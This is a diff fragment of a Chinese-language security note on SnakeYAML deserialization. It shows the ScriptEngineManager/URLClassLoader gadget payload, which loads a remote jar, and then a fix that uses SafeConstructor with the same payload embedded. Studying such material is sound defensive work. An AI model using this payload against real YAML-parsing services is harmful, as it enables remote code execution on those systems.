@@ -30,3 +30,22 @@ yamlMap = yaml.load(inputStream);
 ```
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:7788/exp.jar"]]]]
 ```
+
+
+^
+## **修复**
+其实该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击​
+修复方案：加入new SafeConstructor()类进行过滤
+```
+public class main {​
+    public static void main(String[] args) {​
+        String context = "!!javax.script.ScriptEngineManager [\n" +​
+                "  !!java.net.URLClassLoader [[\n" +​
+                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload-master.jar\"]\n" +​
+                "  ]]\n" +​
+                "]";​
+        Yaml yaml = new Yaml(new SafeConstructor());​
+        yaml.load(context);​
+    }​
+}
+```
